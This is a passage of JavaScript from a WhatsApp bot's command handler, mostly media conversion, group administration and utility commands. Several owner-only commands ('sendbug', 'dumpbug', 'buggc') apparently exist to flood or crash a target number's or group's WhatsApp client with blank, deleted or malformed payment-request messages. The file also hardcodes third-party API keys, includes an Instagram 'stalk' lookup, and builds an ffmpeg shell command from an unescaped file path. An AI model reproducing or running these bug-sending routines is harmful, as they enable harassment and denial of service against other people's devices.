if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = mek.message.extendedTextMessage.contextInfo.participant
await sisaco.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break
	case 'toimage': case 'toimg': {

if (!m.quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
let media = await sisaco.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
sisaco.sendMessage(m.chat, { image: buffer, jpegThumbnail: fake }, { quoted: m})
fs.unlinkSync(ran)
})
}
break
case 'todoc': {
if (!text) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (/document/.test(mime)) throw `Reply to a video/audio ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!quoted) throw `Reply to a video/audio ${prefix + command}`
m.reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
sisaco.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `${text}.mp3`}, { quoted : m })
}
break
case 'tomp4': case 'tovideo': {

if (!m.quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
let { webp2mp4File } = require('./lib/uploader')
let media = await sisaco.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await sisaco.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {

if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want To Use As Audio With Caption ${prefix + command}`)
if (!m.quoted) return reply(`Send/Reply Video/Audio You Want To Use As Audio With Caption ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
sisaco.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tomp3': {

if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
if (!m.quoted) return reply(`Send/Reply Video/Audio You Want To Convert Into MP3 With Caption ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
sisaco.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Converted By ${sisaco.user.name} (${m.id}).mp3`}, { quoted : m })
}
break
case 'tovn': case 'toptt': {

if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
if (!m.quoted) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
sisaco.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true,waveform:"AAMGBwUiLS0vKywyOTQyJiYoJy0sIiAdGBALBQgYLjMsKisoJSMkMjMyMCwjExsbGCQxHiUrJx0gIBcIDBUaIQ=="}, {quoted:m})
}
break
case 'togif': {

if (!m.quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
let { webp2mp4File } = require('./lib/uploader')
let media = await sisaco.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await sisaco.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Gif' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
break
	case 'tourl': {
menufollow(from)
reply(mess.wait)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await sisaco.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
            case 'imagenobg': case 'removebgxxx': case 'remove-bgxxx': {
	    if (!quoted) return replay(`Send/Reply Image With Caption ${prefix + command}`)
	    if (!/image/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command}`)
	    if (/webp/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command}`)
	    let remobg = require('remove.bg')
	    let apirnobg = ['MEwe1Exzhh6z1gE1wu5i3fUJ','MEwe1Exzhh6z1gE1wu5i3fUJ','MEwe1Exzhh6z1gE1wu5i3fUJ','MEwe1Exzhh6z1gE1wu5i3fUJ','7sepdiih7wdsftp9zrsvspav','MEwe1Exzhh6z1gE1wu5i3fUJ','7sepdiih7wdsftp9zrsvspav','MEwe1Exzhh6z1gE1wu5i3fUJ','7sepdiih7wdsftp9zrsvspav']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await sisaco.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    sisaco.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
//©from: dennis
case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = mek.message.extendedTextMessage.contextInfo.participant
await sisaco.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

//©from: dennis × ivan
case 'sendbug':
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (Number(nd[1]) >= 5000) return reply('Jumlah terlalu banyak!')
if (!Number(nd[1])) return reply('Jumlah harus berupa angka!')
for (let i = 0; i < nd[1]; i++){
await sleep(5000)
let sendbug = await sisaco.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "‎" })
await sleep(1000)
sisaco.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
break

//©from: dennis × andik
case 'dumpbug':
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}dumpbug ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
sisaco.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" }, { quoted: contactMessage })
sisaco.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" }, { quoted: contactMessage })
sisaco.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" }, { quoted: contactMessage })
sisaco.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" }, { quoted: contactMessage })
await sleep(1000)
sisaco.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
reply(`Sukses mengirim bug ke nomor ${dn}`)
break

//©from: dennis x haikal
case 'buggc':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎"}}}), { userJid: mek.chat })
sisaco.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(1000)
await sisaco.groupLeave(from)
break
case 'adlt': 
if (!isGroup) return reply('Bruhhh isnt a group')
const key = {
    remoteJid: m.mek.contextInfo.remoteJid,
    fromMe: false,
    id: m.mek.contextInfo.stanzaId,
    participant: sisaco.decodeJid(m.mek.contextInfo.participant)
}
await sisaco.sendMessage(m.chat, { delete: key })

break 
//©from: dennis
case 'autobug':
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:mek})
if (dn === 'on'){ autobug = true
reply('Sukses')
} else if (dn === 'off'){ autobug = false
reply('Sukses')} else { reply('Error')}
break

//©from: dennis x baileys
case '01':
sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:mek})
break

//©from: dennis x baileys
case '02':
sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
break

//©from: dennis x baileys
case '03':
sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: `${prefix}ping`},{title: "Option 2", rowId: `.ping`, description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: '${prefix}ping'},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
break

//©from: dennis
case 'chat':
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
sisaco.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: `${nd[1]}` })
reply(`Sukses mengirim pesan ${nd[1]} ke nomor ${nd[0]}`)
break

//©from: dennis
case 'join':
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
let resultt = args[0].split('https://chat.whatsapp.com/')[1]
await sisaco.groupAcceptInvite(result)
break

//©from: dennis
case 'leave':
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await sisaco.groupLeave(from)
break

//©from: dennis
case 'delete': case 'd': case 'del':
sisaco.sendMessage(from, { delete: { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break
case 'igstalk':
if (!dn) return reply(mess.error.cmd)
anu = await fetchJson(`https://violetics.pw/api/stalk/instagram?apikey=185e-c6d9-7d49&username=${dn}`, {method: 'get'})
if (anu.status == 400 || anu.isError == true) return reply(`${anu.message}`)
buffer = await getBuffer(anu.result.profile_pic_url)
abu = anu.result
raw = `「 *IG-STALK* 」

❏ *Name* : ${abu.full_name}
❏ *Username* : ${abu.username}
❏ *Followers* : ${abu.edge_followed_by.count}
❏ *Following* : ${abu.edge_follow.count}
❏ *Post* : ${abu.edge_owner_to_timeline_media.count}
❏ *Private/public* : ${abu.is_private}
❏ *Bio* : ${abu.biography}
` 
sisaco.sendMessage(from, { image : buffer, caption:raw})
break
	case 'p':
	case 'ping':
	         
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			if (isGroup){sisaco.relayMessage(m.chat, { requestPaymentMessage: {noteMessage: { extendedTextMessage: { text: pingnya, jpegThumbnail:tu}}}}, {})
            }
            else
              reply(pingnya)   
			})
			break 
			
case 'hidetag':{
if (!quoted) return reply('reply to msg')
if (!isGroup) return reply('Bish its not group')
await sisaco.sendMessage(m.chat, { text : q ? q : '' ,jpegThumbnail:tu, mentions: participants.map(a => a.id)})	
}		  
break	
case 'tag':{
        if (!quoted) return reply('reply to msg')
        if (!isGroup) return reply('Bish its not group')       
        let media = await sisaco.downloadAndSaveMediaMessage(quoted)
        if (/audio|video/.test(mime)) { 		  
        sisaco.sendMessage(text, {audio: media, mimetype: 'audio/mpeg', ptt: true, mentions: participants.map(a => a.id),contextInfo: {externalAdReply : {title : `𝗡𝗲𝗿𝗱𝘆𝘆𝘆𝘆`, renderLargerThumbnail:false, showAdAttribution: true, body: `9:07●━━━━━━── 10:49⇆`, mediaUrl: `www.instagram.com`, mediaType: 2, thumbnail: thumb }}}) 
    	}
    	else if(/webp/.test(mime)) {
    	 sisaco.sendMessage(m.chat, { sticker: media, mentions: participants.map(a => a.id) })
    	}
    	else if(/image/.test(mime)){
    	sisaco.sendMessage(m.chat, { image: media, mentions: participants.map(a => a.id) })

    	}
    	else if(/video/.test(mime)){
    	sisaco.sendMessage(m.chat, { video: media, mentions: participants.map(a => a.id) })

    	}
    	else if(/document/.test(mime)){
    	sisaco.sendMessage(m.chat, { document: media, mentions: participants.map(a => a.id) })
    	}
    	else 
    	reply('Not a Valid Message')
}

break		  
//©from: dennis
case 'restart':
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis
case 'shutdown':
if (!isOwner && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break
default:
}} catch (e) {
console.log(e)
sisaco.sendMessage("919995595067@s.whatsapp.net", {text:e})}}
